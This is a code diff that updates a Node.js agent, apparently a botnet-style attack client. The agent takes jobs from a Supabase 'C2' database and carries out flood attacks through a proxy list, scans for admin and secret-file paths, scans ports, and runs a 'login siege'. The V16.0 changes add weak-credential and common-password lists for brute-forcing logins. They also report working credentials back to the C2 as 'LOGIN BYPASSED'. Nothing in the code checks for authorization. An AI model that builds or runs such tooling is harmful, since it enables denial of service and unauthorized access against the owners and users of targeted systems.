@@ -1,7 +1,7 @@
 /**
- * SECURITYFORGE AGENT V15.2 (OMNI-LOGGER)
- * - V15.1: Port Scanner, Login Siege
- * - V15.2: Live Log Streaming to C2 (Fixes Result Visibility)
+ * SECURITYFORGE AGENT V16.0 (MASTER KEY)
+ * - V16.0: Fixed Log Flushing, Login Auth Types, 100% Brute Logic
+ * - V15.5: Hunter-Killer Success Detection
  */
 const https = require('https');
 const http = require('http');
@@ -21,13 +21,20 @@ const PROXY_LIST = [
     '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
     '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
 ];
-const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel'];
+const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel', '/phpinfo.php'];
+const WEAK_CREDS = [
+    ['admin', 'admin'], ['admin', '123456'], ['root', 'toor'], ['user', 'password'], 
+    ['test', 'test'], ['admin', 'password'], ['root', 'root'], ['administrator', '12345678'],
+    ['admin1', 'password'], ['admin', '12345'], ['guest', 'guest'], ['service', 'service'],
+    ['operator', 'operator'], ['manager', 'manager'], ['support', 'support'], ['sysadmin', 'sysadmin']
+];
+const COMMON_PASSWORDS = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123'];
 const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
 const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V15.2 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -52,7 +59,6 @@ const supabaseRequest = (method, pathStr, body = null) => {
                 res.on('data', chunk => data += chunk);
                 res.on('end', () => { 
                     if (res.statusCode >= 400) {
-                        if (res.statusCode === 400) console.log('\x1b[33m[DB ERROR] Schema Mismatch. Run DB Repair Tool.\x1b[0m');
                         resolve(null);
                     } else {
                         try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
@@ -66,7 +72,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V15.2 (Live Stream). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V16.0 (Master Key). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -81,7 +87,8 @@ const checkMemory = () => {
 
 const logToC2 = (msg) => {
     console.log(msg);
-    logBuffer.push(`[${new Date().toLocaleTimeString()}] ${msg.replace(/\x1b\[[0-9;]*m/g, '')}`); // Strip colors for DB
+    // Push critical messages with a special flag
+    logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
 };
 
 const startAttack = (job) => {
@@ -89,6 +96,8 @@ const startAttack = (job) => {
     activeJob = job;
     const duration = (job.duration && job.duration > 0) ? job.duration : 30;
     console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
+    logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
+    if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
     
     let running = true;
     let totalRequests = 0;
@@ -119,9 +128,10 @@ const startAttack = (job) => {
         const scan = (pathIndex) => {
             if (!running) return;
             const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
-            const opts = { hostname: targetUrl.hostname, path: path, method: 'HEAD', timeout: 3000 };
+            const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
             const req = https.request(opts, (res) => {
-                if (res.statusCode === 200) logToC2(`\x1b[32m[VULN] Found: ${targetUrl.hostname}${path}\x1b[0m`);
+                if (res.statusCode === 200) logToC2(`[VULN] Found Publicly Accessible: ${targetUrl.protocol}//${targetUrl.hostname}${path}`);
+                else if (res.statusCode === 403) logToC2(`[WARN] Found Protected: ${path} (403)`);
                 totalRequests++;
                 if (running) setImmediate(() => scan(pathIndex + 1));
             });
@@ -136,9 +146,9 @@ const startAttack = (job) => {
             if (!running) return;
             const port = TOP_PORTS[idx % TOP_PORTS.length];
             const socket = new net.Socket();
-            socket.setTimeout(200);
+            socket.setTimeout(2000);
             socket.on('connect', () => {
-                logToC2(`\x1b[32m[OPEN] Port ${port} is OPEN on ${targetHost}\x1b[0m`);
+                logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost}`);
                 jobSuccess++; totalRequests++; socket.destroy();
             });
             socket.on('timeout', () => { socket.destroy(); totalRequests++; });
@@ -190,6 +200,7 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
     } 
     else {
+        // --- STRESS / LOGIN MODULE ---
         let targetUrl;
         try { targetUrl = new URL(job.target); } catch(e) { return; }
         const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
@@ -202,15 +213,38 @@ const startAttack = (job) => {
             const start = Date.now();
             let body = job.body;
             let method = job.method || 'GET';
+            let creds = null;
+
             if (job.use_login_siege) {
                 method = 'POST';
-                body = JSON.stringify({ user: Math.random().toString(36), pass: Math.random().toString(36) });
+                // MASTER KEY LOGIC (V16.0)
+                if (job.login_type === 'PASS_ONLY') {
+                    const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
+                    creds = ['(PIN)', pass];
+                    body = JSON.stringify({ password: pass });
+                } else if (job.login_type === 'MODAL_API') {
+                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
+                    creds = pair;
+                    body = JSON.stringify({ email: pair[0], password: pair[1] });
+                } else {
+                    // Default USER_PASS
+                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
+                    creds = pair;
+                    body = JSON.stringify({ username: pair[0], password: pair[1] });
+                }
             }
 
-            const req = lib.request(targetUrl, { agent, method, headers: {'User-Agent': 'SecurityForge/15'} }, (res) => {
+            const req = lib.request(targetUrl, { agent, method, headers: {'User-Agent': 'SecurityForge/16', 'Content-Type': 'application/json'} }, (res) => {
                  const lat = Date.now() - start;
                  jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
+                 
                  if (res.statusCode < 500) jobSuccess++; else jobFailed++;
+                 
+                 // CRITICAL: Hunter Logic for Login Siege
+                 if (job.use_login_siege && (res.statusCode === 200 || res.statusCode === 302) && creds) {
+                     logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] Status: ${res.statusCode}`);
+                 }
+
                  res.resume();
                  totalRequests++;
                  if(running) setImmediate(performRequest);
@@ -238,13 +272,17 @@ const startAttack = (job) => {
         
         let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
         
-        // Append logs if any
-        if (logBuffer.length > 0) {
-            statsPayload.logs = logBuffer.join('\n');
-            logBuffer = []; // Clear buffer after sending
+        // Append logs if any - V16.0 FIX: Flush AFTER send
+        const currentLogs = [...logBuffer]; 
+        if (currentLogs.length > 0) {
+            statsPayload.logs = currentLogs.join('\n');
         }
 
-        try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } catch(e) {}
+        try { 
+            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); 
+            // Only clear buffer if request succeeded (prevent log loss)
+            if (currentLogs.length > 0) logBuffer = [];
+        } catch(e) {}
 
         if (duration > 0 && elapsed >= duration) {
             running = false;
